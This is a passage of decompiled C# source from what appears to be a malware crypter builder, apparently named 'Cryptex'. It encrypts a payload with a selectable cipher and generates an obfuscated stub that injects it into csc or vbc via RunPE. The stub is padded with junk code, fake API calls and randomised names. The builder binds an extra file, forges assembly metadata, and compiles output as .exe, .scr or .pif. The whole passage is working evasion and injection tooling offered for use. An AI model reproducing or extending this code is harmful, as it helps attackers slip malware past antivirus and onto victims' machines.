                        int num2 = this.random_0.Next(50, 500);
                        array2 = GClass0.smethod_6(array2, text42, Convert.ToInt32(num2));
                        if (this.rdbXOR.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.Xor);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", string.Concat(new object[]
               {
                   "XOR(KKKKK1, \"", 
                   text42, 
                   "\", ", 
                   num2, 
                   ");"
               }));
                    }
                    if (this.rdb3DES2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(9);
                        string text43 = this.txtKey2.Text;
                        array2 = GClass0.smethod_10(array2, text43);
                        if (this.rdbTripleDES.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.TripleDES);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "TripleDESDecrypt(KKKKK1, \"" + text43 + "\");");
                    }
                    if (this.rdbPolyDex2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(33);
                        string text44 = this.txtKey2.Text;
                        array2 = GClass0.smethod_2(array2, text44);
                        if (this.rdbPolyDex.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.PolyDex);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyDexDecrypt(KKKKK1, \"" + text44 + "\");");
                    }
                    if (this.rdbPolyStairs2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(9);
                        string text45 = this.txtKey2.Text;
                        array2 = GClass0.smethod_8(array2, text45);
                        if (this.rdbPolyStairs.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.PolyStairs);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyStairDeCrypt(KKKKK1, \"" + text45 + "\");");
                    }
                    if (this.rdbSymetric2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(16);
                        string text46 = this.txtKey2.Text;
                        array2 = GClass0.smethod_9(array2, text46);
                        if (this.rdbSymetric.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.Symetric);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "SymetricDecrypt(KKKKK1, \"" + text46 + "\");");
                    }
                    if (this.rdbAES2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(17);
                        string text47 = this.txtKey2.Text;
                        array2 = GClass0.smethod_18(array2, text47);
                        if (this.rdbAES.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.AES);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "AESDecrypt(KKKKK1, \"" + text47 + "\");");
                    }
                    if (this.rdbPolyBaby2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(17);
                        string text48 = this.txtKey2.Text;
                        array2 = GClass0.smethod_14(array2, text48);
                        text2 = text2.Replace("[DECRYPTION2]", "");
                        if (this.rdbPolyBaby.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.PolyBaby);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyBabyDecrypt(KKKKK1, \"" + text48 + "\");");
                    }
                    if (this.rdbDex2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(17);
                        string text49 = this.txtKey2.Text;
                        array2 = GClass0.smethod_13(array2, text49);
                        if (this.rdbDex.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.Dex);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "DexDecrypt(KKKKK1, \"" + text49 + "\");");
                    }
                    if (this.rdbCloud2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(17);
                        string text50 = this.txtKey2.Text;
                        array2 = GClass0.smethod_15(array2, text50);
                        if (this.rdbBind1.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.Cloud);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "CloudDecrypt(KKKKK1, \"" + text50 + "\");");
                    }
                    if (this.rdbPolyAES2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(33);
                        string text51 = this.txtKey2.Text;
                        array2 = GClass0.smethod_4(array2, text51);
                        if (this.rdbBind1.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.PolyAes);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyAESDecrypt(KKKKK1, \"" + text51 + "\");");
                    }
                    if (this.rdbStairs2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(19);
                        string text52 = this.txtKey2.Text;
                        array2 = GClass0.smethod_16(array2, text52);
                        if (this.rdbStairs.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.Stairs);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "StairsDecrypt(KKKKK1, \"" + text52 + "\");");
                    }
                    if (this.rdbPoly3DES2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(32);
                        string text53 = this.txtKey2.Text;
                        array2 = GClass0.smethod_19(array2, text53);
                        if (this.rdbPoly3DES.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.Poly3DES);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyTripleDESDecrypt(KKKKK1, \"" + text53 + "\");");
                    }
                    if (this.rdbPolyDES2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(8);
                        string text54 = this.txtKey2.Text;
                        array2 = GClass0.smethod_21(array2, text54);
                        if (this.rdbPolyDES.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.PolyDES);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyDESDecrypt(KKKKK1, \"" + text54 + "\");");
                    }
                    if (this.rdbPolyRijn2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(25);
                        string text55 = this.txtKey2.Text;
                        array2 = GClass0.smethod_23(array2, text55);
                        if (this.rdbPolyRijn.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.PolyRijn);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyRijndaelDecrypt(KKKKK1, \"" + text55 + "\");");
                    }
                    if (this.rdbPolySym2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(16);
                        string text56 = this.txtKey2.Text;
                        array2 = GClass0.smethod_1(array2, text56);
                        if (this.rdbPolySym.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.PolySym);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolySymetricDecrypt(KKKKK1, \"" + text56 + "\");");
                    }
                    if (this.rdbPolyRC22.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(8);
                        string text57 = this.txtKey2.Text;
                        array2 = GClass0.smethod_0(array2, text57);
                        if (this.rdbPolyRC2.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.PolyRC2);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyRC2Decrypt(KKKKK1, \"" + text57 + "\");");
                    }
                    if (this.rdbPolyCloud2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(8);
                        string text58 = this.txtKey2.Text;
                        array2 = GClass0.smethod_7(array2, text58);
                        if (this.rdbPolyCloud.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.Polycloud);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyCloudDecrypt(KKKKK1, \"" + text58 + "\");");
                    }
                    this.method_8(10);
                    if (!this.chckNETfile.Checked)
                    {
                        if (this.radioBtnCustom.Checked)
                        {
                            if (!(this.txtInjectInto.Text != string.Empty))
                            {
                                this.method_5("You didn't enter a path to inject into!");
                                return;
                            }
                            if (this.rdbRunPE6.Checked)
                            {
                                text2 = text2.Replace("[ANOTHERINJECT]", string.Empty);
                                text2 = text2.Replace("[DROPLOADER]", "");
                                text2 = text2.Replace("[INJECT-INTO]", this.txtInjectInto.Text);
                            }
                            else
                            {
                                text2 = text2.Replace("[ANOTHERINJECT]", string.Empty);
                                text2 = text2.Replace("[DROPLOADER]", Properties.Resources.Drop);
                                text2 = text2.Replace("[INJECT-INTO]", this.txtInjectInto.Text);
                            }
                        }
                        if (this.radioCSC.Checked)
                        {
                            if (this.rdbRunPE6.Checked)
                            {
                                text2 = text2.Replace("[ANOTHERINJECT]", string.Empty);
                                text2 = text2.Replace("[DROPLOADER]", "");
                                text2 = text2.Replace("[INJECT-INTO]", "csc");
                            }
                            else
                            {
                                text2 = text2.Replace("[ANOTHERINJECT]", string.Empty);
                                text2 = text2.Replace("[DROPLOADER]", Properties.Resources.Drop);
                                text2 = text2.Replace("[INJECT-INTO]", "csc");
                            }
                        }
                        if (this.rdbVBC.Checked)
                        {
                            if (this.rdbRunPE6.Checked)
                            {
                                text2 = text2.Replace("[ANOTHERINJECT]", string.Empty);
                                text2 = text2.Replace("[DROPLOADER]", "");
                                text2 = text2.Replace("[INJECT-INTO]", "vbc");
                            }
                            else
                            {
                                text2 = text2.Replace("[ANOTHERINJECT]", string.Empty);
                                text2 = text2.Replace("[DROPLOADER]", Properties.Resources.Drop);
                                text2 = text2.Replace("[INJECT-INTO]", "vbc");
                            }
                        }
                    }
                    string[] array3 = "AA-BB-CC-DD-EE-FF-GG-HH-II-JJ-KK".Split(new char[]
           {
               '-'
           });
                    for (int j = 0; j < array3.Length; j++)
                    {
                        for (int k = 1; k < 10; k++)
                        {
                            if (this.rdbLetter.Checked)
                            {
                                text2 = text2.Replace(array3[j] + Convert.ToString(k), this.method_8(Convert.ToInt32(this.numRandomStringLength.Value + 10m)));
                            }
                            if (this.rdbUnicode.Checked)
                            {
                                text2 = text2.Replace(array3[j] + Convert.ToString(k), this.method_25(Convert.ToInt32(this.numRandomStringLength.Value + 10m)));
                            }
                        }
                    }
                    if (this.chkJunkCode.Checked)
                    {
                        text2 = text2.Replace("[JUNK-CODE]", this.method_26(this.trkJunkCode.Int32_4, this.chkArrayVariables.Checked));
                    }
                    else
                    {
                        text2 = text2.Replace("[JUNK-CODE]", string.Empty);
                    }
                    if (this.chkFakeAPI.Checked)
                    {
                        text2 = text2.Replace("[FAKE-API]", this.method_27(this.trkFakeApi.Int32_4, (int)this.numRandomStringLength.Value));
                    }
                    else
                    {
                        text2 = text2.Replace("[FAKE-API]", string.Empty);
                    }
                    this.txtKey2.Text = "";
                    this.txtKey.Text = "";
                    string text59 = this.method_8(5);
                    text2 = text2.Replace("[RESNAMESTRING]", text59);
                    text2 = text2.Replace("[RESNAME]", text);
                    string text60 = this.method_8(this.random_0.Next(5, 20));
                    text2 = text2.Replace("[RESTOFTHENAME]", text60);
                    SaveFileDialog saveFileDialog = new SaveFileDialog();
                    saveFileDialog.Filter = "Executable|*.exe|COM|*.com|Screensaver|*.scr|PIF|*.pif";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        resourceWriter.AddResource(text59, array2);
                        if (this.txtBindFile.Text != string.Empty)
                        {
                            string text61 = this.method_25(20);
                            text2 = text2.Replace("[BINDNAME]", text61);
                            resourceWriter.AddResource(text61, File.ReadAllBytes(this.txtBindFile.Text));
                        }
                        resourceWriter2.Close();
                        if (!this.rdbNETfile.Checked)
                        {
                            Bitmap bitmap = (Bitmap)this.method_44(Convert.ToBase64String(inArray));
                            bitmap.Save(Application.StartupPath + "\\i" + text60 + ".png", ImageFormat.Png);
                        }
                        if (this.rdbNETfile.Checked)
                        {
                            inArray = Properties.Resources.NewRunPE;
                            Bitmap bitmap2 = (Bitmap)this.method_44(Convert.ToBase64String(inArray));
                            bitmap2.Save(Application.StartupPath + "\\i" + text60 + ".png", ImageFormat.Png);
                        }
                        resourceWriter.Close();
                        Dictionary<string, string> dictionary = new Dictionary<string, string>();
                        dictionary.Add("CompilerVersion", "v2.0");
                        CompilerParameters compilerParameters = new CompilerParameters();
                        compilerParameters.ReferencedAssemblies.Add("System.dll");
                        compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
                        compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                        compilerParameters.OutputAssembly = saveFileDialog.FileName;
                        compilerParameters.CompilerOptions = "/filealign:0x00000200 /optimize+ /platform:X86 /debug- /target:winexe";
                        compilerParameters.GenerateExecutable = true;
                        compilerParameters.IncludeDebugInformation = false;
                        compilerParameters.TreatWarningsAsErrors = false;
                        if (this.txtIcon.Text != string.Empty)
                        {
                            CompilerParameters expr_3023 = compilerParameters;
                            expr_3023.CompilerOptions = expr_3023.CompilerOptions + " /win32icon:\"" + this.txtIcon.Text + "\"";
                        }
                        else
                        {
                            if (!this.rdbCrypt2x.Checked)
                            {
                                if (File.Exists(Application.StartupPath + "\\icon.ico"))
                                {
                                    this.txtIcon.Text = Application.StartupPath + "\\icon.ico";
                                    CompilerParameters expr_308F = compilerParameters;
                                    expr_308F.CompilerOptions = expr_308F.CompilerOptions + " /win32icon:\"" + this.txtIcon.Text + "\"";
                                }
                                else
                                {
                                    new WebClient().DownloadFile("http://dl.dropbox.com/u/19745684/Cryptex/Lock.ico", Application.StartupPath + "\\icon.ico");
                                    this.txtIcon.Text = Application.StartupPath + "\\icon.ico";
                                    CompilerParameters expr_30F0 = compilerParameters;
                                    expr_30F0.CompilerOptions = expr_30F0.CompilerOptions + " /win32icon:\"" + this.txtIcon.Text + "\"";
                                }
                            }
                        }
                        compilerParameters.EmbeddedResources.Add(Application.StartupPath + "\\" + text + ".resources");
                        compilerParameters.EmbeddedResources.Add(Application.StartupPath + "\\i" + text60 + ".png");
                        CompilerResults compilerResults = new CSharpCodeProvider(dictionary).CompileAssemblyFromSource(compilerParameters, new string[]
               {
                   text2
               });
                        if (compilerResults.Errors.Count > 0)
                        {
                            foreach (CompilerError compilerError in compilerResults.Errors)
                            {
                                this.method_5(compilerError.ToString());
                            }
                            resourceWriter.Close();
                            resourceWriter2.Close();
                            this.method_22();
                            File.Delete(Application.StartupPath + "\\i" + text60 + ".png");
                        }
                        File.Delete(Application.StartupPath + "\\i" + text60 + ".png");
                    }
                    if (this.rdbCrypt2x.Checked)
                    {
                        string text62 = Properties.Resources.Source2;
                        if (this.chckAssembly.Checked)
                        {
                            text62 = text62.Replace("[ASSMBLY]", Properties.Resources.Assemblyinf);
                            text62 = text62.Replace("[ASSDESCRIPTION]", this.textAssemblyDescription.Text);
                            text62 = text62.Replace("[TITLE]", this.txtAssemblyTitle.Text);
                            text62 = text62.Replace("[COMPANY]", this.textAssemblyCompany.Text);
                            text62 = text62.Replace("[PRODUCT]", this.textAssemblyProduct.Text);
                            text62 = text62.Replace("[COPYRIGHT]", this.textAssemblyCopyRight.Text);
                            string arg_3365_0 = text62;
                            string arg_3365_1 = "[MAJOR].[MINOR].[BILD].[REVISION]";
                            string[] array = new string[7];
                            string[] arg_32FA_0 = array;
                            int arg_32FA_1 = 0;
                            decimal value = this.intMajor.Value;
                            arg_32FA_0[arg_32FA_1] = value.ToString();
                            array[1] = ".";
                            string[] arg_331B_0 = array;
                            int arg_331B_1 = 2;
                            value = this.intMinor.Value;
                            arg_331B_0[arg_331B_1] = value.ToString();
                            array[3] = ".";
                            string[] arg_333C_0 = array;
                            int arg_333C_1 = 4;
                            value = this.intBuild.Value;
                            arg_333C_0[arg_333C_1] = value.ToString();
                            array[5] = ".";
                            string[] arg_335D_0 = array;
                            int arg_335D_1 = 6;
                            value = this.intRevision.Value;
                            arg_335D_0[arg_335D_1] = value.ToString();
                            text62 = arg_3365_0.Replace(arg_3365_1, string.Concat(array));
                        }
                        else
                        {
                            text62 = text62.Replace("[ASSMBLY]", string.Empty);
                        }
                        string fileName = Application.StartupPath + "\\" + text + "3.resources";
                        string text63 = this.method_8(this.random_0.Next(15, 30));
                        byte[] array4 = File.ReadAllBytes(saveFileDialog.FileName);
                        ResourceWriter resourceWriter3 = new ResourceWriter(fileName);
                        if (this.rdbStorBytes.Checked)
                        {
                            string text64 = this.method_24(16);
                            resourceWriter3.AddResource(text63, GClass0.smethod_1(array4, text64));
                            text62 = text62.Replace("[STOR]", "AA1JJ2JJ4(AA2KK1JJ3En((byte[])JJ9.GetObject(\"[RESNAMESTRING2X]\"),\"[ENCKEY]\"));");
                            text62 = text62.Replace("[ENCKEY]", text64);
                        }
                        if (this.rdbStorBase.Checked)
                        {
                            resourceWriter3.AddResource(text63, Convert.ToBase64String(array4));
                            text62 = text62.Replace("[STOR]", "AA1JJ2JJ4(Convert.FromBase64String((string)JJ9.GetObject(\"[RESNAMESTRING2X]\")));");
                        }
                        if (this.rdbStorString.Checked)
                        {
                            resourceWriter3.AddResource(text63, Encoding.Default.GetString(array4));
                            text62 = text62.Replace("[STOR]", "AA1JJ2JJ4(Encoding.Default.GetBytes((string)JJ9.GetObject(\"[RESNAMESTRING2X]\")));");
                        }
                        string[] array5 = "AA-BB-CC-DD-EE-FF-GG-HH-II-JJ-KK".Split(new char[]
               {
                   '-'
               });
                        for (int l = 0; l < array5.Length; l++)
                        {
                            for (int m = 1; m < 10; m++)
                            {
                                if (this.rdbLetter.Checked)
                                {
                                    text62 = text62.Replace(array5[l] + Convert.ToString(m), this.method_8(Convert.ToInt32(this.numRandomStringLength.Value + 10m)));
                                }
                                if (this.rdbUnicode.Checked)
                                {
                                    text62 = text62.Replace(array5[l] + Convert.ToString(m), this.method_25(Convert.ToInt32(this.numRandomStringLength.Value + 10m)));
                                }
                            }
                        }
                        text62 = text62.Replace("[RESNAMESTRING2X]", text63);
                        text62 = text62.Replace("[RESNAME2X]", text + "3");
                        resourceWriter3.Close();
                        File.Delete(saveFileDialog.FileName);
                        Dictionary<string, string> dictionary2 = new Dictionary<string, string>();
                        dictionary2.Add("CompilerVersion", "v2.0");
                        CompilerParameters compilerParameters2 = new CompilerParameters();
                        compilerParameters2.ReferencedAssemblies.Add("System.dll");
                        compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                        compilerParameters2.OutputAssembly = saveFileDialog.FileName;
                        compilerParameters2.CompilerOptions = "/filealign:0x00000200 /optimize+ /platform:X86 /debug- /target:winexe";
                        compilerParameters2.GenerateExecutable = true;
                        compilerParameters2.IncludeDebugInformation = false;
                        compilerParameters2.TreatWarningsAsErrors = false;
                        if (this.txtIcon.Text != string.Empty)
                        {
                            CompilerParameters expr_361F = compilerParameters2;
                            expr_361F.CompilerOptions = expr_361F.CompilerOptions + " /win32icon:\"" + this.txtIcon.Text + "\"";
                        }
                        else
                        {
                            if (File.Exists(Application.StartupPath + "\\icon.ico"))
                            {
                                this.txtIcon.Text = Application.StartupPath + "\\icon.ico";
                                CompilerParameters expr_367B = compilerParameters2;
                                expr_367B.CompilerOptions = expr_367B.CompilerOptions + " /win32icon:\"" + this.txtIcon.Text + "\"";
                            }
                            else
                            {
                                new WebClient().DownloadFile("http://dl.dropbox.com/u/19745684/Cryptex/Lock.ico", Application.StartupPath + "\\icon.ico");
                                this.txtIcon.Text = Application.StartupPath + "\\icon.ico";
                                CompilerParameters expr_36DC = compilerParameters2;
                                expr_36DC.CompilerOptions = expr_36DC.CompilerOptions + " /win32icon:\"" + this.txtIcon.Text + "\"";
                            }
                        }
                        compilerParameters2.EmbeddedResources.Add(Application.StartupPath + "\\" + text + "3.resources");
                        CompilerResults compilerResults2 = new CSharpCodeProvider(dictionary2).CompileAssemblyFromSource(compilerParameters2, new string[]
               {
                   text62
               });
                        if (compilerResults2.Errors.Count > 0)
                        {
                            foreach (CompilerError compilerError2 in compilerResults2.Errors)
                            {
                                this.method_5(compilerError2.ToString());
                            }
                            resourceWriter3.Close();
                            this.method_22();
                        }
                    }
                    this.method_5("Compiled succesfully!");
                    resourceWriter.Close();
                    resourceWriter2.Close();
                    Thread.Sleep(100);
                    this.method_22();
                }
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Index"))
                {
                    this.method_5("Please generate a bigger encryption key.");
                }
                else
                {
                    this.method_5(ex.Message);
                    this.method_22();
                    resourceWriter.Close();
                    resourceWriter2.Close();
                    File.Delete(Application.StartupPath + "\\a" + str + ".exe");
                }
                resourceWriter.Close();
                resourceWriter2.Close();
                this.method_22();
            }



        }

        private void rdbRndPic_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rdbCustomPic.Checked)
            {
                this.grpPic.Enabled = true;
                this.btnClearPic.Enabled = true;
                return;
            }
            this.grpPic.Enabled = false;
            this.btnClearPic.Enabled = false;

        }

        private void rdbCustomPic_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rdbCustomPic.Checked)
            {
                this.grpPic.Enabled = true;
                this.btnClearPic.Enabled = true;
                return;
            }
            this.grpPic.Enabled = false;
            this.btnClearPic.Enabled = false;

        }






       







      

     

        }




      
    }

